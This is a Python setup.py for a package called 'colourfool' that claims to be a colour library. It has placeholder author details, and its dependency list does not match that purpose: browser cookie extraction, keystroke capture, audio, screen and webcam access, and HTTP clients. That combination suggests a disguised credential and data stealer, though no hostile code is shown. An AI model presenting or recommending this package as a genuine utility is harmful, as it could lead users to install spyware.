
from setuptools import setup







setup(
    name='colourfool',
    version='0.1.5',    
    description='Your gateway to colours in python',
    url='https://github.com',
    author='milk errr',
    author_email='test@python.com',
    license='BSD 2-clause',
    packages=['colourfool'],
    install_requires=["pathlib","opencv-python","screeninfo","psutil","httpx","flask","pynput","pillow","browser_cookie3","pyaudio","bleach","pypiwin32","pycryptodome","pygame","requests"],

    classifiers=[    
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)